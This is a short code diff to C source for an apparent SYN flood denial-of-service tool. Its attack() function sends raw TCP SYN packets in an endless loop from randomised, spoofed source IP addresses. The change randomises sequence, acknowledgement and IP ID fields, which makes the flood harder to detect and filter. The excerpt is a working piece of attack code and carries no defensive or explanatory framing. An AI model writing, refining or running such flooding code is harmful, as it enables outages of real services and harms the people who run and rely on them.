@@ -117,19 +117,23 @@ void make_packet(struct tcp_packet *packet, struct sockaddr_in *addr)
 
     ranip.s_addr = rand();
 
-    make_tcp_header(&packet->tcphdr, ranip, port, addr->sin_addr, ntohs(addr->sin_port), 0, 0, TH_SYN);
-    make_ip_header(&packet->iphdr, ranip, addr->sin_addr, sizeof(struct tcphdr));
+    make_tcp_header(&packet->tcphdr, ranip, port, addr->sin_addr, ntohs(addr->sin_port), rand(), rand(), TH_SYN);
+    make_ip_header(&packet->iphdr, ranip, addr->sin_addr, sizeof(struct tcphdr), rand());
     port++;
 }
 
 int attack(int sock, struct sockaddr_in *addr)
 {
     struct tcp_packet packet;
+    char buf[100], sendbuf[100];
+    struct iphdr ip;
+    struct tcphdr tcp;
 
     memset(&packet, 0, sizeof(struct tcp_packet));
 
     while(1)
     {
+        memset(&packet, 0, sizeof(struct tcp_packet));
         make_packet(&packet, addr);
         
 		if(sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *)addr, sizeof(struct sockaddr_in))<0)
